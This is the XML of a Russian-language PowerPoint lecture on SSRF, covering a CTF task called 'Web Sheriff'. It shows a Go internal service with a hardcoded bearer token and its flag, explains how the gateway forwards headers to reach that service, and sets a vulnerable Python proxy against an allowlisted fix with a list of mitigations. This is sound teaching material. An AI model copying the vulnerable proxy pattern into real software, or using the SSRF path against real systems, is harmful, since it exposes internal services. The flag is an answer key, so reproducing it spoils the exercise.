              <a:rPr sz="1275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"/usr/local/bin/lab-service"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1275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pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF61958D-2FC0-4340-B5B0-13FA13B3F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4155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D5D79A9-E499-4092-BBC9-357761DD4F6B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Web Sheriff: шаг 4. Внутренний сервис</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="important-label">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BCB0960E-512F-44DD-A03A-0E92B6AE28E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2095500"/>
            <a:ext cx="3409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Что важно в коде</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="important-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1F850F9-ECE9-4562-BF23-7479767BF125}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8096250" y="2771775"/>
            <a:ext cx="3409950" cy="3371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Маршрут /flag возвращает флаг.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1950" b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Сервис проверяет Authorization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1950" b="0">
              <a:solidFill>
                <a:srgbClr val="EEF2F6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00000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Gateway передаёт headers пользователя: найденный токен можно отправить через него.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="auth">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B2E6464-C704-4B4E-A0E3-CF5E9E3260E1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6762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Доступ через SSRF не отменяет проверку авторизации внутреннего сервиса.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="editable-source-code-106">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90D72FD2-3A3C-4861-9D97-DF20AAB87E2E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6896100" cy="20164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6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96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96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96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96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96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96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96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96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96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96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6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6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6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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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mux.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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HandleFunc</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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6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"/flag"</a:t>
            </a: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60" b="0">
                <a:solidFill>
                  <a:srgbClr val="F44747"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960" b="0">
                <a:solidFill>
                  <a:srgbClr val="179F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w http.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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ResponseWriter</a:t>
            </a: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r *http.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960" b="0">
                <a:solidFill>
                  <a:srgbClr val="179F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60" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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960" b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Original internal-service authorization rule retained for source review.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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96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r.Header.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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96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6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"Authorization"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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!= </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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"Bearer MireactfG00000000l"</a:t>
            </a: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6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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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    http.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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Error</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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w, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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"Unauthorized"</a:t>
            </a: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http.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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StatusUnauthorized</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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</a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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96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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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w.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960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Header</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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()</a:t>
            </a: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60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96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6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"Content-Type"</a:t>
            </a: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6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"text/plain; charset=utf-8"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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96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fmt.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="960" b="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Fprintln</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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w, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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"KB2CTF{ssrf_demo}"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="96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96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60" b="0">
                <a:solidFill>
                  <a:srgbClr val="179FFF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96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0000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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6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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="96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6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96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mux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="960" b="0">
                <a:solidFill>
                  <a:srgbClr val="D4D4D4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pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF61958D-2FC0-4340-B5B0-13FA13B3F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56314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603E358-09DF-44AB-8152-170F288DD523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Web Sheriff: шаг 5. Получаем флаг</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="result">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A52C5085-F757-495E-83EE-6A3B903D06FA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Gateway запрашивает /flag внутреннего сервиса и возвращает флаг в message.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="evidence-111-1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B1DB50B-D0EA-461E-9588-4D5F3274F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00" r="16600" b="17000"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1657350"/>
            <a:ext cx="10820400" cy="4996815"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Рисунок 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF61958D-2FC0-4340-B5B0-13FA13B3F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4203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A7C99CE6-E3E6-4EE0-BA8A-AF39764A45F7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Web Sheriff: защита от SSRF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426F74A-A9D8-46FE-8577-9AB8AF8C7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3" name="v17-text-125">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B9C3D52A-A7E8-4341-B024-5F43E6407C5F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5067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8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Как не надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v17-text-126">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{273C8585-42A1-460F-B37D-FEEEB094D574}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="1914525"/>
            <a:ext cx="5067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8000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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C97070"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Как надо</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="v17-text-127">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC356386-CA7A-4FE0-B431-F48FCBC74482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50673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url = data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"url"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headers = data.get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"headers"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 = requests.get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url,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headers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=headers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jsonify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message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=r.text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6" name="v17-text-128">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4060DE5-9F38-4957-A602-8F6B3EA1319C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2476500"/>
            <a:ext cx="50673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4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SOURCES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"sample"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"http://ssrf-sample:8080/"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url = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0">
                <a:solidFill>
                  <a:srgbClr val="4FC1FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SOURCES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.get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65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"source_id"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="0">
                <a:solidFill>
                  <a:srgbClr val="DA70D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url </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="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None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abort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400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session = requests.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b="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Session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session.trust_env = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="165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False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 = session.get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url, </a:t>
            </a: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timeout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 b="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EEF2F6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 b="0">
                <a:solidFill>
                  <a:srgbClr val="D7BA7D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>allow_redirects</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1650" b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 b="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650" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFD70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7" name="v17-text-129">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{58640BA5-9096-46F0-8DE0-8772CA292C9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5324475"/>
            <a:ext cx="10287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203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Выбирать URL и headers на сервере по разрешённому id.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/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t>Запретить redirect, ограничить время и размер ответа.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-101600" algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
              <a:buChar char="•"/>
              <a:defRPr sz="1725" b="0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t>Ограничить исходящую сеть; проверять права на целевом сервисе.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="78305407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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{750A4F34-2545-45AD-82B7-22ABF9492364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Практика и материалы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="resource-0">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBE5DC8E-6095-4599-9180-972139855615}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1828799"/>
            <a:ext cx="3524250" cy="423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l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="1950" b="1">
                <a:solidFill>
                  <a:srgbClr val="C97070"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:defRPr>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1950" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C97070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22" name="Рисунок 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C6E7C77-8E42-4885-8A82-C6B56A12B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sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B66155F7-E493-41C9-A630-7870A3153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" y="1135022"/>
            <a:ext cx="11715750" cy="44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467886"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="DejaVu Sans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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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PortSwigger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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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Web Security Academy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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — теория веб-уязвимостей и практические лабораторные.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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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Hack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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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The Box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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — курсы, CTF-задачи и лаборатории по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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>пентесту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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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TryHackMe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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — обучение кибербезопасности с пошаговыми практическими заданиями. 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467886"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="DejaVu Sans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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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DVWA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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — уязвимое веб-приложение для изучения атак и способов защиты.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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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OWASP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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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Juice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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu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Shop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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — учебное веб-приложение с заданиями по поиску уязвимостей.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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sa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KB2CTF Web Security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467886"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> — задания и исходный код стендов из лекции.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467886"/>
              </a:solidFill>
              <a:effectLst/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38869189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D8591165-3F40-4494-A1FB-27DF50AEE596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10820400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lnSpc>
                <a:spcPct val="113000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:def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Telegram и обратная связь</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="v4-text-168">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DA0081F-4B96-447E-9CC8-53B29FAEE4C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2009775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4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lnSpc>
                <a:spcPct val="113000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="24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Telegram-канал</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="v4-text-172">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E8B16953-5D4D-4560-9B41-B9C25628FA38}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2009775"/>
            <a:ext cx="506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4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lnSpc>
                <a:spcPct val="113000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="240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EF2F6"/>
                </a:solidFill>
                <a:latin typeface="DejaVu Sans"/>
                <a:ea typeface="DejaVu Sans"/>
                <a:cs typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Обратная связь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E8036F7-9C0C-47FC-8028-D297D4EB5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430CD80-6F2F-43E1-A8DB-978E141E7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706" y="2486025"/>
            <a:ext cx="3267488" cy="369115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FBEB57-5464-BC67-4B59-4C13FD2D3A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133" y="2838156"/>
            <a:ext cx="3286125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50951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68BDD5C-60B4-440C-B7C1-95FAFC125DD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1164047"/>
            <a:ext cx="10820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43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43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43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43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43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43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43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43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43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43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350" b="1">
                <a:solidFill>
                  <a:srgbClr val="EEF2F6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4350" b="1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Спасибо</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="435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4350" b="1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за</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" sz="435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4350" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0" err="1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внимание</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="4350" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="EEF2F6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  <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Рисунок 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E8036F7-9C0C-47FC-8028-D297D4EB5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049000" y="6229350"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Рисунок 5" descr="Салем, он такой... | Пикабу">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A5D63CA-577C-779C-61A6-96D57E567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187" y="5520812"/>
            <a:ext cx="1417830" cy="1316892"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Рисунок 6" descr="А какой ты Салем в этот понедельник? Кадры: сериал «Сабрина — маленькая  ведьма», 1996 #сериалы #мемы">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA6A0202-239D-7437-35E9-AADDAEC0A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20812"/>
            <a:ext cx="1337187" cy="1337187"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Рисунок 7" descr="Кот салем из сабрины маленькой ведьмы видео, смотреть подборку из 100  тематических материалов онлайн в хорошем качестве на RUTUBE">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE7AE544-27DD-DF14-9120-30526B0049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4949" y="2451516"/>
            <a:ext cx="5262102" cy="295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9325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1421</TotalTime>
  <Words>8238</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <DocSecurity>0</DocSecurity>
  <PresentationFormat>Широкоэкранный</PresentationFormat>
  <Paragraphs>1511</Paragraphs>
  <Slides>111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111</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="121" baseType="lpstr">
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>DejaVu Sans</vt:lpstr>
      <vt:lpstr>Fira Code</vt:lpstr>
      <vt:lpstr>Inter</vt:lpstr>
      <vt:lpstr>JetBrains Mono</vt:lpstr>
      <vt:lpstr>ChatGPT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Александр фурсенко</cp:lastModifiedBy>
  <cp:revision>54</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-15T18:25:18Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-19T19:14:10Z</dcterms:modified>
</cp:coreProperties>
</file>